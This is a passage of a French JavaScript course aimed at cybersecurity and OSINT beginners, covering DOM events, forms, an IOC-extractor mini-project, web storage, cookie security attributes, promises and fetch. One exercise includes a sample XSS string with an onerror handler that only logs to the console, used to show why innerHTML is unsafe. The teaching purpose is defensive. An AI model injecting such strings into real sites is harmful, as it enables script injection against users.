Mets côte à côte deux zones : une qui affiche une saisie avec `innerHTML`, l'autre avec `textContent`. Passe la chaîne `"<img src=x onerror=console.log('XSS')>"`. Observe dans la console que la version `innerHTML` déclenche le code et pas la version `textContent`. Rédige en commentaire pourquoi, en deux phrases. *(But pédagogique défensif : comprendre la faille pour l'éviter.)*

## ✅ Tu sais maintenant…

- modifier le texte avec `textContent` (sûr) ;
- comprendre que `innerHTML` interprète le HTML (puissant mais risqué) ;
- expliquer le mécanisme d'un DOM XSS ;
- appliquer la règle « donnée externe → `textContent` » ;
- manipuler classes (`classList`) et attributs (`setAttribute`) ;
- proscrire `eval`.

-----

# Chapitre 16 — Événements

## Le minimum à savoir

Jusqu'ici, ton code s'exécutait une fois, au chargement. Le web est **interactif** : on veut réagir aux **événements** (clic, frappe, envoi de formulaire). C'est le cœur du modèle JavaScript navigateur.

### `addEventListener`

On attache une fonction à un élément, qui s'exécutera quand l'événement se produit.

```html
<button id="lancer">Lancer l'analyse</button>
<script src="script.js"></script>
```

```javascript
const bouton = document.querySelector("#lancer");

bouton.addEventListener("click", () => {
  console.log("Bouton cliqué !");
});
```

Structure : `element.addEventListener("nom_evenement", fonction)`. La fonction (souvent fléchée) s'appelle un **callback** : elle est exécutée « plus tard », quand l'événement arrive.

### Événements courants

| Événement | Déclenché quand… |
| --- | --- |
| `click` | on clique sur l'élément |
| `input` | le contenu d'un champ change (à chaque frappe) |
| `submit` | un formulaire est envoyé |
| `keydown` | une touche est pressée |
| `change` | un champ perd le focus après modification |

### L'objet `event`

Le callback reçoit un objet `event` décrivant ce qui s'est passé :

```javascript
const champ = document.querySelector("#recherche");

champ.addEventListener("input", (event) => {
  console.log("Valeur actuelle :", event.target.value);
});
```

`event.target` est l'élément concerné ; `.value` est le contenu d'un champ.

## Très utile en pratique

Réagir à un clic en modifiant la page (en sécurité avec `textContent`) :

```html
<input id="ip" placeholder="Entrez une IP">
<button id="verifier">Vérifier</button>
<p id="resultat"></p>
<script src="script.js"></script>
```

```javascript
const champ = document.querySelector("#ip");
const bouton = document.querySelector("#verifier");
const resultat = document.querySelector("#resultat");

function estIpPrivee(ip) {
  return ip.startsWith("10.") || ip.startsWith("192.168.") || ip.startsWith("172.16.");
}

bouton.addEventListener("click", () => {
  const ip = champ.value.trim();
  const type = estIpPrivee(ip) ? "privée" : "publique";
  resultat.textContent = `${ip} → ${type}`;   // ✅ textContent
});
```

## Exemple simple

```javascript
const bouton = document.querySelector("#compteur");
let clics = 0;

bouton.addEventListener("click", () => {
  clics++;
  console.log(`Clics : ${clics}`);
});
```

## Application IT / cyber / OSINT

Les événements rendent tes **petits outils web** interactifs : un champ où coller du texte, un bouton qui lance l'extraction d'IOC, un résultat qui s'affiche. Les mini-projets « inspecteur d'IOC » et « lookup OSINT » (Parties 3 et 5) reposent dessus. Comprendre les événements, c'est aussi comprendre comment une page réagit aux actions — utile pour analyser le comportement d'une application web. En sécurité, c'est souvent sur un `submit` ou un `input` que se branchent validations (et failles).

> ### 🔍 Lecture de code inconnu
> Repérer les `addEventListener` dans un script inconnu te dit **à quelles actions le code réagit** (clics, envois de formulaire) et **ce qu'il déclenche** (souvent un appel réseau, chapitre 22).

## ❌ Erreur classique

```javascript
// ❌ Appeler la fonction au lieu de la passer
bouton.addEventListener("click", maFonction());   // ❌ () exécute TOUT DE SUITE
bouton.addEventListener("click", maFonction);      // ✅ on passe la fonction
bouton.addEventListener("click", () => maFonction()); // ✅ ou via une flèche

// ❌ Attacher l'événement avant que l'élément existe (script trop tôt)
// → bouton vaut null → addEventListener plante. Place le script en fin de body.

// ❌ Oublier .value et manipuler le champ lui-même
const v = champ;          // l'élément
const v2 = champ.value;   // ✅ le contenu texte du champ
```

> **Réflexe diagnostic :** ton bouton « ne réagit pas » ? Vérifie : le sélecteur est-il bon (pas `null`) ? Le script est-il bien à la fin du `<body>` ? As-tu passé la **fonction** (sans `()`) et non son résultat ?

## Exercices

**Guidé**
1. Crée un bouton et un `<p id="msg">`.
2. Au clic, mets `"Cliqué !"` dans le `<p>` avec `textContent`.
3. Ajoute un compteur de clics affiché dans le `<p>`.

**Autonome**
Crée un champ de saisie et un `<p>`. À chaque frappe (`input`), affiche en direct le nombre de caractères saisis dans le `<p>`.

**Défi**
Crée un mini-vérificateur : un champ pour une URL, un bouton « Extraire le domaine ». Au clic, utilise `new URL(champ.value)` (dans un `try/catch` car l'URL peut être invalide) et affiche le domaine avec `textContent`, ou un message d'erreur si l'URL est invalide.

## ✅ Tu sais maintenant…

- attacher un comportement avec `addEventListener("event", callback)` ;
- reconnaître `click`, `input`, `submit`, `keydown`, `change` ;
- lire l'objet `event` et `event.target.value` ;
- récupérer le contenu d'un champ avec `.value` ;
- passer une fonction sans l'exécuter (pas de `()`) ;
- diagnostiquer un événement qui ne se déclenche pas.

-----

# Chapitre 17 — Formulaires et limites de la validation côté client

## Le minimum à savoir

Un **formulaire** regroupe des champs et un bouton d'envoi. JavaScript peut lire les valeurs, réagir à l'envoi, et **valider** la saisie.

```html
<form id="recherche">
  <input id="terme" placeholder="Terme à chercher">
  <button type="submit">Chercher</button>
</form>
<p id="sortie"></p>
<script src="script.js"></script>
```

```javascript
const form = document.querySelector("#recherche");
const terme = document.querySelector("#terme");
const sortie = document.querySelector("#sortie");

form.addEventListener("submit", (event) => {
  event.preventDefault();   // ⚠️ empêche le rechargement de la page
  const valeur = terme.value.trim();
  sortie.textContent = `Recherche : ${valeur}`;   // ✅ textContent
});
```

### `event.preventDefault()` : le réflexe formulaire

Par défaut, envoyer un formulaire **recharge la page**. Pour traiter la saisie en JavaScript sans rechargement, on appelle `event.preventDefault()` au début du callback `submit`. Sans ça, ton code semble « ne rien faire » car la page se recharge aussitôt.

### Valider une saisie

```javascript
form.addEventListener("submit", (event) => {
  event.preventDefault();
  const valeur = terme.value.trim();

  if (valeur === "") {
    sortie.textContent = "⚠️ Le champ est vide";
    return;
  }
  if (valeur.length < 3) {
    sortie.textContent = "⚠️ Au moins 3 caractères";
    return;
  }

  sortie.textContent = `Recherche valide : ${valeur}`;
});
```

## Très utile en pratique

La validation côté client améliore l'**expérience** : retour immédiat, messages clairs, moins d'erreurs. Mais elle a une limite fondamentale, qui est une notion de sécurité majeure.

> ### 🛡️ Réflexe sécurité (MAJEUR) : la validation côté client ne protège RIEN
> La validation JavaScript dans le navigateur sert **uniquement au confort de l'utilisateur**. Elle **ne sécurise rien**, car :
>
> - l'utilisateur peut **désactiver JavaScript** ;
> - l'utilisateur peut **modifier ton code** dans les DevTools ;
> - l'utilisateur peut envoyer une requête **directement au serveur**, en contournant totalement ta page (avec `curl`, Postman, etc.).
>
> **Seule la validation côté serveur protège réellement.** C'est le risque n° 3 de la Boîte à risques. Corollaire (risque n° 8) : **masquer ou désactiver un bouton côté frontend n'interdit pas l'action** — quelqu'un peut toujours appeler l'opération directement. Le frontend, c'est l'expérience ; le serveur, c'est la sécurité.

## Exemple simple

```javascript
const form = document.querySelector("#form-ip");
const champ = document.querySelector("#champ-ip");
const sortie = document.querySelector("#sortie");

form.addEventListener("submit", (event) => {
  event.preventDefault();
  const ip = champ.value.trim();
  const valide = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip);
  sortie.textContent = valide ? `IP acceptée : ${ip}` : "Format d'IP invalide";
});
```

## Application IT / cyber / OSINT

Cette notion est **centrale en sécurité web**. Un pentester ou un analyste SOC ne fait **jamais** confiance au frontend : il sait que toute validation, tout contrôle d'accès, toute logique implémentée uniquement côté navigateur peut être contournée. Comprendre cela te protège de l'erreur de conception la plus répandue : croire qu'un contrôle côté client est une barrière de sécurité. C'est aussi ce qui rend tant d'applications vulnérables — et ce que tu apprendras à repérer dans la suite « Web Security » de cette collection.

## ❌ Erreur classique

```javascript
// ❌ Oublier preventDefault → la page se recharge, ton code "ne fait rien"
form.addEventListener("submit", () => {
  sortie.textContent = "traité";   // disparaît aussitôt : la page recharge
});

// ✅ CORRECT
form.addEventListener("submit", (event) => {
  event.preventDefault();
  sortie.textContent = "traité";
});

// ❌ Croire que la validation client sécurise
// if (motDePasse === "admin") { donnerAcces(); }
// ☠️ Tout est côté client : trivialement contournable. La sécurité est au serveur.
```

> **Réflexe diagnostic :** ton formulaire « clignote » ou se vide à l'envoi ? Tu as oublié `event.preventDefault()`.

## Exercices

**Guidé**
1. Crée un formulaire avec un champ et un bouton d'envoi.
2. Au `submit`, empêche le rechargement et affiche la valeur saisie.
3. Refuse les valeurs vides avec un message.

**Autonome**
Crée un formulaire qui valide un email côté client (présence de `@` et d'un `.`) et affiche « valide » ou « invalide ». Ajoute **en commentaire** une phrase rappelant que cette validation ne remplace pas celle du serveur.

**Défi**
Crée un formulaire « ajouter une IP à surveiller » : il valide le format IPv4, refuse les doublons (garde les IP dans un tableau JavaScript), et affiche la liste à jour avec `textContent`. Réfléchis : qu'est-ce qui empêcherait quelqu'un de contourner ta validation ? (Réponse en commentaire : rien, côté client — d'où la nécessité du serveur.)

## ✅ Tu sais maintenant…

- lire les champs d'un formulaire et réagir au `submit` ;
- empêcher le rechargement avec `event.preventDefault()` ;
- valider une saisie côté client pour le confort ;
- expliquer pourquoi la validation client ne sécurise rien ;
- expliquer pourquoi masquer un bouton ne protège pas une action.

-----

## 🧩 Mini-projet — Inspecteur d'IOC dans une page (chapitres 14 à 17)

Rassemble la Partie 3. Une page où l'on colle du texte et qui en extrait les IOC, affichés **en sécurité**.

`index.html` :

```html
<!DOCTYPE html>
<html lang="fr">
  <head><meta charset="UTF-8"><title>Inspecteur d'IOC</title></head>
  <body>
    <h1>Inspecteur d'IOC</h1>
    <textarea id="entree" rows="8" cols="60" placeholder="Collez un texte (logs, rapport...)"></textarea>
    <br>
    <button id="analyser">Analyser</button>
    <h2>IP trouvées</h2>
    <ul id="liste-ip"></ul>
    <h2>Résumé</h2>
    <p id="resume"></p>
    <script src="script.js"></script>
  </body>
</html>
```

`script.js` :

```javascript
const entree = document.querySelector("#entree");
const bouton = document.querySelector("#analyser");
const listeIp = document.querySelector("#liste-ip");
const resume = document.querySelector("#resume");

const RE_IP = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g;

bouton.addEventListener("click", () => {
  const texte = entree.value;

  // Extraire et dédoublonner les IP
  const ipsTrouvees = texte.match(RE_IP) || [];
  const ipsUniques = [...new Set(ipsTrouvees)];

  // Vider la liste précédente
  listeIp.textContent = "";

  // Afficher chaque IP EN SÉCURITÉ (textContent, jamais innerHTML)
  for (const ip of ipsUniques) {
    const li = document.createElement("li");
    li.textContent = ip;          // ✅ textContent : pas d'injection possible
    listeIp.appendChild(li);
  }

  // Résumé
  resume.textContent =
    `${ipsTrouvees.length} IP au total, ${ipsUniques.length} uniques.`;
});
```

**Ce que tu obtiens :** colle un bloc de logs, clique « Analyser », et la page liste les IP uniques + un résumé. Chaque IP est insérée avec `textContent` et `createElement` — **jamais** `innerHTML` —, ce qui rend l'outil immunisé contre une injection même si le texte collé contient du HTML piégé.

Ce mini-projet mobilise : DOM (`querySelector`, `createElement`, `appendChild`), `textContent` (réflexe sécurité), événements (`click`), regex et `Set` (Partie 2). C'est un vrai petit outil d'analyste, construit proprement.

**Pour aller plus loin :** ajoute l'extraction des emails et des hash (deuxièmes regex), avec leurs propres listes.

-----

## ✅ CHECKPOINT 3 — Tu sais manipuler une page et tu connais le réflexe XSS

Avant la Partie 4, assure-toi de pouvoir, **sans regarder** :

- [ ] expliquer ce qu'est le DOM et sélectionner avec `querySelector` ;
- [ ] modifier le contenu avec `textContent` et savoir pourquoi pas `innerHTML` sur des données externes ;
- [ ] expliquer le mécanisme d'un DOM XSS ;
- [ ] manipuler classes et attributs ;
- [ ] réagir à un événement avec `addEventListener` ;
- [ ] gérer un formulaire avec `event.preventDefault()` ;
- [ ] expliquer pourquoi la validation client ne sécurise rien ;
- [ ] réaliser le mini-projet inspecteur d'IOC.

Tu sais faire vivre une page **en sécurité**. La Partie 4 aborde le stockage de données dans le navigateur — et les pièges de sécurité associés.


-----

# Chapitre 18 — LocalStorage et SessionStorage

## Le minimum à savoir

Le navigateur offre un moyen de **stocker des données** côté client, qui survivent au rechargement de la page : le **Web Storage**. Il en existe deux variantes.

### LocalStorage : persistant

```javascript
// Écrire (toujours des chaînes de caractères)
localStorage.setItem("derniere_ip", "8.8.8.8");

// Lire
const ip = localStorage.getItem("derniere_ip");
console.log(ip);   // "8.8.8.8"

// Supprimer une clé
localStorage.removeItem("derniere_ip");

// Tout effacer
localStorage.clear();
```

`localStorage` **persiste** même après fermeture du navigateur. Les données restent jusqu'à suppression explicite.

### SessionStorage : temporaire

Même API, mais les données disparaissent à la **fermeture de l'onglet**.

```javascript
sessionStorage.setItem("etape", "2");
console.log(sessionStorage.getItem("etape"));   // "2"
```

### Stocker des objets : passer par JSON

Le Web Storage ne stocke **que des chaînes**. Pour un objet, on sérialise en JSON (Partie 2).

```javascript
const prefs = { theme: "sombre", langue: "fr" };

// Écrire un objet
localStorage.setItem("prefs", JSON.stringify(prefs));

// Relire et reconvertir
const lu = JSON.parse(localStorage.getItem("prefs"));
console.log(lu.theme);   // "sombre"
```

## Très utile en pratique

Mémoriser une préférence d'interface entre deux visites :

```javascript
// Au chargement : restaurer la préférence
const theme = localStorage.getItem("theme") || "clair";
console.log(`Thème : ${theme}`);

// Sur action utilisateur : sauvegarder
function changerTheme(nouveau) {
  localStorage.setItem("theme", nouveau);
}
```

## Exemple simple

```javascript
// Compter les visites de la page
let visites = Number(localStorage.getItem("visites") || 0);
visites++;
localStorage.setItem("visites", visites);
console.log(`Visite n° ${visites}`);
```

(Le `Number(...)` reconvertit la chaîne stockée en nombre.)

## Application IT / cyber / OSINT

Le Web Storage est utile pour des **préférences** ou un **état non sensible** dans tes petits outils web (thème, dernier terme recherché, historique local d'analyse). Mais il est surtout important de connaître ses **limites de sécurité**, car c'est une source fréquente de vulnérabilités dans les applications réelles que tu analyseras.

> ### 🛡️ Réflexe sécurité (MAJEUR) : jamais de secret dans LocalStorage
> **Ne stocke JAMAIS de token, mot de passe, clé d'API ou donnée sensible dans LocalStorage ou SessionStorage.** Raison : **tout JavaScript exécuté sur la page peut les lire** (`localStorage.getItem(...)`). Donc si la page subit une **faille XSS** (chapitre 15), l'attaquant lit instantanément tout ton LocalStorage et **vole les tokens**. C'est les risques n° 4 et n° 5 de la Boîte à risques.
>
> Pour l'authentification, les jetons de session sérieux sont gérés via des **cookies `HttpOnly`** (chapitre suivant), justement **inaccessibles** à JavaScript.

> ### ⚠️ À ne pas confondre : cookie / sessionStorage / LocalStorage
> | | LocalStorage | SessionStorage | Cookie |
> | --- | --- | --- | --- |
> | **Durée** | jusqu'à suppression | fermeture de l'onglet | configurable |
> | **Envoyé au serveur ?** | non | non | **oui, automatiquement** |
> | **Lisible par JS ?** | oui | oui | oui, **sauf si `HttpOnly`** |
> | **Usage typique** | préférences | état temporaire | session / authentification |
>
> C'est le risque n° 6 : choisir le mauvais mécanisme mène à des fuites ou des pertes.

## ❌ Erreur classique

```javascript
// ☠️ LA faute grave : stocker un token côté client
localStorage.setItem("auth_token", "eyJhbGci...");   // volé au premier XSS

// ❌ Oublier que tout est chaîne
localStorage.setItem("compteur", 5);
const c = localStorage.getItem("compteur");
console.log(c + 1);        // "51" (concaténation de chaînes !)
console.log(Number(c) + 1); // 6  ✅ reconvertir en nombre

// ❌ Stocker un objet sans JSON
localStorage.setItem("user", { nom: "admin" });
console.log(localStorage.getItem("user"));   // "[object Object]" — données perdues !
// ✅ JSON.stringify à l'écriture, JSON.parse à la lecture
```

> **Réflexe diagnostic :** une valeur stockée se comporte « comme du texte » (concaténée au lieu d'additionnée) ? Normal : le Web Storage ne stocke que des chaînes. Reconvertis avec `Number(...)` ou `JSON.parse(...)`.

## Exercices

**Guidé**
1. Stocke ton nom dans `localStorage` sous la clé `"nom"`.
2. Relis-le et affiche-le.
3. Recharge la page : vérifie qu'il est toujours là. Supprime-le avec `removeItem`.

**Autonome**
Stocke un objet de préférences `{theme, langue}` en JSON. Relis-le, change le thème, resauvegarde. Vérifie après rechargement.

**Défi**
Implémente un compteur de visites persistant ET un mini-historique : à chaque visite, ajoute l'horodatage (`new Date().toISOString()`) dans un tableau stocké en JSON dans `localStorage`. Affiche les 5 dernières visites. Réfléchis (commentaire) : pourquoi ne mettrais-tu **jamais** un token de session ici ?

## ✅ Tu sais maintenant…

- écrire/lire/supprimer avec `localStorage` et `sessionStorage` ;
- distinguer persistant (Local) et temporaire (Session) ;
- stocker des objets via `JSON.stringify`/`JSON.parse` ;
- expliquer pourquoi un secret ne doit jamais y être stocké ;
- distinguer cookie / sessionStorage / LocalStorage.

-----

# Chapitre 19 — Cookies et les limites de JavaScript

## Le minimum à savoir

Un **cookie** est une petite donnée stockée par le navigateur, avec une particularité majeure : il est **envoyé automatiquement au serveur** à chaque requête vers le site. C'est historiquement le mécanisme des **sessions** (rester connecté).

### Lire et écrire des cookies en JavaScript

```javascript
// Lire tous les cookies accessibles à JS (une seule chaîne)
console.log(document.cookie);   // "theme=sombre; langue=fr"

// Écrire un cookie
document.cookie = "theme=sombre; path=/";
```

L'API `document.cookie` est rudimentaire (tout est dans une seule chaîne à découper soi-même). C'est volontaire : **les cookies sérieux ne sont pas censés être gérés par JavaScript**.

### Les attributs de sécurité essentiels

Un cookie peut porter des attributs qui changent radicalement sa sécurité. Ils sont posés par le **serveur** (via l'en-tête `Set-Cookie`), pas par JavaScript.

| Attribut | Effet | Pourquoi c'est important |
| --- | --- | --- |
| **`HttpOnly`** | le cookie est **invisible** à JavaScript (`document.cookie` ne le voit pas) | protège contre le vol par XSS |
| **`Secure`** | envoyé **uniquement en HTTPS** | empêche l'interception en clair |
| **`SameSite`** | limite l'envoi vers d'autres sites (`Strict`, `Lax`, `None`) | protège contre le CSRF |

```text
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

## Très utile en pratique

> ### 🛡️ Réflexe sécurité : pourquoi `HttpOnly` est une bonne chose
> Quand un cookie de session est **`HttpOnly`**, JavaScript **ne peut pas le lire**. C'est exactement ce qu'on veut : même si la page subit un XSS, l'attaquant ne peut pas voler le cookie de session via `document.cookie`. C'est pour cela qu'on préfère un **cookie `HttpOnly`** à un token en LocalStorage (chapitre 18) pour l'authentification.
>
> Un cookie de session **sans** `HttpOnly`, `Secure` et `SameSite` est vulnérable (vol par XSS, interception, CSRF). C'est le risque n° 16 de la Boîte à risques.

## Exemple simple

```javascript
// Poser un cookie de préférence (non sensible) côté client
document.cookie = "affichage=compact; path=/; SameSite=Lax";

// Lire et chercher une valeur
function lireCookie(nom) {
  const paires = document.cookie.split("; ");
  for (const paire of paires) {
    const [cle, valeur] = paire.split("=");
    if (cle === nom) return valeur;
  }
  return null;
}

console.log(lireCookie("affichage"));   // "compact"
```

## Application IT / cyber / OSINT

Comprendre les cookies et leurs attributs est **central en sécurité web défensive**. En analyse, tu inspectes les en-têtes `Set-Cookie` d'une application (onglet *Réseau* des DevTools) pour vérifier la présence de `HttpOnly`, `Secure`, `SameSite` : leur **absence** est une faiblesse notable, souvent relevée dans les audits. Comprendre que JavaScript **ne doit pas** voir le cookie de session t'aide à raisonner sur le vol de session et le XSS. C'est un sujet que tu approfondiras dans la suite « Web Security ».

> ### 🔍 Lecture de code inconnu
> Un script qui lit ou écrit `document.cookie` mérite attention : que manipule-t-il ? Un cookie sensible géré en JavaScript (au lieu de `HttpOnly` côté serveur) est un signal de conception risquée.

## ❌ Erreur classique

```javascript
// ❌ Croire que document.cookie voit TOUS les cookies
console.log(document.cookie);
// → ne montre PAS les cookies HttpOnly (et c'est voulu, pour la sécurité)

// ☠️ Gérer une session sensible via document.cookie en JS
document.cookie = "session=" + token;   // sans HttpOnly → volable par XSS

// ❌ Confondre où se posent les attributs de sécurité
// HttpOnly / Secure / SameSite des cookies de session = posés par le SERVEUR,
// pas par JavaScript. JS ne peut pas rendre un cookie HttpOnly.
```

> **Réflexe diagnostic :** un cookie « n'apparaît pas » dans `document.cookie` ? Il est probablement `HttpOnly` — invisible à JavaScript par conception. Regarde l'onglet *Application* → *Cookies* des DevTools pour le voir.

## Exercices

**Guidé**
1. Pose un cookie de préférence non sensible avec `document.cookie`.
2. Relis tous les cookies avec `document.cookie`.
3. Écris une fonction `lireCookie(nom)` qui extrait une valeur précise.

**Autonome**
Sur une application web réelle où tu es connecté (la tienne ou un service de test), ouvre DevTools → *Application* → *Cookies*, et repère quels cookies ont `HttpOnly`, `Secure`, `SameSite`. Note lesquels sont invisibles dans `document.cookie` (les `HttpOnly`).

**Défi**
Rédige (en commentaires dans un fichier) un mini-mémo défensif : pour un cookie de session, quels attributs poser et pourquoi, et pourquoi LocalStorage est un mauvais endroit pour un token. Appuie-toi sur les chapitres 18 et 19.

## ✅ Tu sais maintenant…

- comprendre qu'un cookie est envoyé automatiquement au serveur ;
- lire/écrire des cookies non sensibles avec `document.cookie` ;
- expliquer `HttpOnly`, `Secure`, `SameSite` ;
- comprendre pourquoi un cookie de session `HttpOnly` est invisible à JS (et pourquoi c'est bien) ;
- raisonner sur le choix cookie vs LocalStorage pour un token.

-----

## ✅ CHECKPOINT 4 — Tu sais où (ne pas) stocker des données côté client

Avant la Partie 5, assure-toi de pouvoir, **sans regarder** :

- [ ] utiliser `localStorage` / `sessionStorage` (écrire, lire, supprimer) ;
- [ ] stocker un objet via JSON ;
- [ ] expliquer pourquoi un token ne va jamais en LocalStorage ;
- [ ] distinguer cookie / sessionStorage / LocalStorage ;
- [ ] expliquer `HttpOnly`, `Secure`, `SameSite` ;
- [ ] comprendre pourquoi un cookie de session `HttpOnly` est invisible à JS.

Tu maîtrises le stockage client et ses pièges. La Partie 5 ouvre le web dynamique : faire parler ta page au réseau, avec l'asynchrone et `fetch`.


-----

# Chapitre 20 — Comprendre l'asynchrone

## Le minimum à savoir

C'est **le concept le plus important et le plus déroutant** de JavaScript. On l'aborde en douceur, avec l'idée avant la syntaxe.

### Synchrone vs asynchrone

Jusqu'ici, ton code s'exécutait **dans l'ordre, ligne par ligne** : c'est **synchrone**.

```javascript
console.log("1");
console.log("2");
console.log("3");
// affiche 1, 2, 3 dans l'ordre
```

Mais certaines opérations prennent du **temps** : interroger un serveur, lire un fichier, attendre. JavaScript ne **bloque pas** en les attendant — il continue, et traite le résultat **plus tard**. C'est **asynchrone**.

```javascript
console.log("Début");

setTimeout(() => {
  console.log("Plus tard (après 1 seconde)");
}, 1000);

console.log("Fin");

// Affiche :
// Début
// Fin
// Plus tard (après 1 seconde)   ← arrive APRÈS, même si écrit avant "Fin" dans le code !
```

`setTimeout(fonction, ms)` exécute la fonction **après** un délai, sans bloquer le reste. C'est l'illustration la plus simple du « plus tard ».

### Le callback : « fais ça quand ce sera prêt »

La fonction qu'on donne à `setTimeout` (ou à `addEventListener`) est un **callback** : du code à exécuter quand un événement futur se produit. Tu en as déjà utilisé avec les événements (chapitre 16). L'asynchrone généralise cette idée à tout ce qui « prend du temps ».

> ### ⚠️ À ne pas confondre : ordre d'écriture vs ordre d'exécution
> En asynchrone, **l'ordre des lignes dans ton code n'est pas l'ordre d'exécution**. Ce qui est « différé » (réseau, `setTimeout`) s'exécute après le code synchrone qui suit. C'est la source n° 1 de confusion des débutants. Garde en tête : *le réseau et les timers arrivent « plus tard »*.

## Très utile en pratique

Pourquoi c'est nécessaire : imagine que demander une page au serveur prenne 2 secondes. Si JavaScript **bloquait** pendant ces 2 secondes, toute la page se figerait (boutons inertes, scroll bloqué). L'asynchrone permet à l'interface de **rester réactive** pendant que la requête voyage. C'est indispensable pour le web.

## Exemple simple

```javascript
console.log("Lancement de l'analyse...");

setTimeout(() => {
  console.log("Analyse terminée (résultat reçu)");
}, 2000);

console.log("L'interface reste utilisable pendant l'attente");
```

## Application IT / cyber / OSINT

Toute interaction réseau est asynchrone : interroger une API de threat intel, télécharger une liste d'IOC, vérifier une réputation d'IP. Comprendre l'asynchrone est le préalable indispensable à `fetch` (chapitre 22). Sans ce modèle mental, le code réseau paraît « se comporter dans le désordre ». Avec lui, tu écris des outils qui interrogent des services distants sans figer l'interface.

## ❌ Erreur classique

```javascript
// ❌ Croire qu'on récupère un résultat asynchrone tout de suite
let resultat;
setTimeout(() => { resultat = "données"; }, 1000);
console.log(resultat);   // undefined ! (le callback n'a pas encore tourné)

// ✅ Utiliser le résultat DANS le callback, là où il est disponible
setTimeout(() => {
  const resultat = "données";
  console.log(resultat);   // "données"
}, 1000);
```

> **Réflexe diagnostic :** une variable est `undefined` juste après une opération asynchrone ? Normal : le résultat n'est pas encore là. Il faut le traiter **dans** le callback (ou avec `await`, chapitre 23), pas sur la ligne suivante.

## Exercices

**Guidé**
1. Affiche `"A"`, puis programme un `setTimeout` de 1 s qui affiche `"C"`, puis affiche `"B"` après le `setTimeout`.
2. Prédis l'ordre d'affichage avant d'exécuter, puis vérifie (A, B, C).

**Autonome**
Programme trois `setTimeout` à 500 ms, 1000 ms et 1500 ms qui affichent `"étape 1/2/3"`. Vérifie qu'ils s'affichent dans l'ordre des délais.

**Défi**
Sans utiliser de variable globale, écris une fonction `simulerRequete(callback)` qui, après 1 s (`setTimeout`), appelle `callback` avec un objet `{ip: "8.8.8.8", score: 10}`. Appelle-la et affiche le score **dans** le callback. Tu viens de reproduire le schéma d'une requête asynchrone.

## ✅ Tu sais maintenant…

- distinguer code synchrone et asynchrone ;
- comprendre que certaines opérations s'exécutent « plus tard » ;
- utiliser `setTimeout` pour illustrer le différé ;
- comprendre le rôle d'un callback ;
- distinguer ordre d'écriture et ordre d'exécution.

-----

# Chapitre 21 — Promesses

## Le minimum à savoir

Gérer l'asynchrone uniquement avec des callbacks devient vite illisible (callbacks imbriqués). JavaScript moderne utilise les **promesses** (*Promises*) : un objet qui représente un **résultat futur**.

Une promesse a trois états : **en attente** (pending), **tenue** (fulfilled, succès), ou **rompue** (rejected, échec).

### `.then` et `.catch`

```javascript
// uneFonctionAsync() renvoie une promesse
uneFonctionAsync()
  .then((resultat) => {
    console.log("Succès :", resultat);
  })
  .catch((erreur) => {
    console.log("Échec :", erreur);
  });
```

- **`.then(callback)`** : exécuté quand la promesse réussit, avec le résultat.
- **`.catch(callback)`** : exécuté si elle échoue, avec l'erreur.

### Illustration avec une promesse simple

```javascript
// Promise.resolve crée une promesse déjà réussie (pour l'exemple)
Promise.resolve("données reçues")
  .then((data) => console.log(data));   // "données reçues"

// Promise.reject crée une promesse en échec
Promise.reject("erreur réseau")
  .catch((err) => console.log("Attrapé :", err));   // "Attrapé : erreur réseau"
```

### Enchaîner les `.then`

Chaque `.then` peut renvoyer une valeur passée au `.then` suivant :

```javascript
Promise.resolve(5)
  .then((n) => n * 2)        // 10
  .then((n) => n + 1)        // 11
  .then((n) => console.log(n)); // 11
```

## Très utile en pratique

Les promesses sont ce que renvoie **`fetch`** (chapitre suivant). Comprendre `.then`/`.catch` te permet de lire et écrire du code réseau. Mais la syntaxe la plus agréable viendra avec `async/await` (chapitre 23), qui n'est qu'une façon plus lisible de manipuler ces mêmes promesses.

## Exemple simple

```javascript
function verifierIp(ip) {
  // Simule une vérification asynchrone qui réussit
  return Promise.resolve({ ip, malveillante: ip === "203.0.113.5" });
}

verifierIp("203.0.113.5")
  .then((res) => {
    console.log(`${res.ip} → malveillante : ${res.malveillante}`);
  });
// 203.0.113.5 → malveillante : true
```

## Application IT / cyber / OSINT

Toutes les APIs modernes s'interrogent via des promesses. Quand tu liras du code qui interroge une API de réputation, tu verras des `.then`/`.catch`. Savoir les lire — même si tu préfères écrire en `async/await` — est indispensable pour comprendre le code existant et les exemples de documentation.

## ❌ Erreur classique

```javascript
// ❌ Oublier le .catch : une erreur passe inaperçue
fetch("https://api.exemple.test/data")
  .then((r) => r.json());
  // si ça échoue, erreur silencieuse non gérée

// ✅ Toujours un .catch
fetch("https://api.exemple.test/data")
  .then((r) => r.json())
  .then((data) => console.log(data))
  .catch((err) => console.log("Erreur :", err.message));

// ❌ Oublier de renvoyer (return) dans un .then qu'on veut chaîner
Promise.resolve(5)
  .then((n) => { n * 2; })     // ne renvoie rien → le then suivant reçoit undefined
  .then((n) => console.log(n)); // undefined
```

> **Réflexe diagnostic :** une chaîne de `.then` reçoit `undefined` ? Un `.then` précédent a oublié de `return` sa valeur.

## Exercices

**Guidé**
1. Crée une promesse réussie avec `Promise.resolve("ok")` et affiche sa valeur dans un `.then`.
2. Crée une promesse en échec avec `Promise.reject("ko")` et attrape-la dans un `.catch`.

**Autonome**
Écris une fonction `chercherScore(ip)` qui renvoie `Promise.resolve(85)`. Appelle-la, et dans un `.then`, affiche `"IP à risque"` si le score `>= 80`, sinon `"IP sûre"`.

**Défi**
Enchaîne trois `.then` : le premier renvoie une IP, le deuxième la transforme en objet `{ip}`, le troisième affiche une phrase. Ajoute un `.catch` final. Observe comment la valeur circule de `.then` en `.then`.

## ✅ Tu sais maintenant…

- comprendre qu'une promesse représente un résultat futur ;
- connaître ses trois états (pending, fulfilled, rejected) ;
- gérer le succès avec `.then` et l'échec avec `.catch` ;
- enchaîner des `.then` en renvoyant des valeurs ;
- toujours prévoir un `.catch`.

-----

# Chapitre 22 — `fetch` et requêtes HTTP

## Le minimum à savoir

**`fetch`** est la fonction moderne pour faire des requêtes HTTP : récupérer des données d'un serveur ou d'une API. Elle renvoie une **promesse**.

### Une requête GET de base

```javascript
fetch("https://api.exemple.test/ip/8.8.8.8")
  .then((reponse) => reponse.json())   // convertir la réponse en objet (JSON)
  .then((donnees) => console.log(donnees))
  .catch((erreur) => console.log("Erreur réseau :", erreur.message));
```

Deux étapes :
1. `fetch(url)` renvoie une promesse de **réponse**.
2. `reponse.json()` lit le corps et le parse en objet JavaScript (renvoie elle aussi une promesse).

